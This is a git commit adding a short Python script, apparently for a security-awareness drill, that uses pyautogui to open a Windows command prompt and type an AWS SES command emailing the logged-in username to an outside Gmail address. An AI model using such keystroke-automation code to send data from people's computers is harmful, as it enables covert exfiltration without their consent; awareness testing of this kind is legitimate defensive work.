05a4f5eccb910cbcc896c2a8f23c505593ed8e1f
Ryan Merkley <94261107+S3it4@users.noreply.github.com>
2023-04-14 20:48:06 -0700

    Add files via upload

---
+++ failed_test.py
@@ -0,0 +1,33 @@
+import os
+import pyautogui
+
+# Wait for 2 seconds
+pyautogui.sleep(2)
+
+# Open the Run dialog
+pyautogui.hotkey('win', 'r')
+
+# Wait for 0.5 seconds
+pyautogui.sleep(0.5)
+
+# Type the command
+pyautogui.typewrite('cmd')
+
+# Press Enter
+pyautogui.press('enter')
+
+# Wait for 2 seconds
+pyautogui.sleep(2)
+
+# Type the AWS SES command
+message = "Subject={Data='Failed Awareness Test'},Body={Text={Data='The user of the computer %username%'}}"
+pyautogui.typewrite(f'aws ses send-email --from krytechcyber@gmail.com --destination ToAddresses=dazeygg@gmail.com --message "{message}"')
+
+# Press Enter
+pyautogui.press('enter')
+
+# Wait for 0.5 seconds
+pyautogui.sleep(0.5)
+
+# Press the Down arrow key to close the Command Prompt window
+pyautogui.press('down')
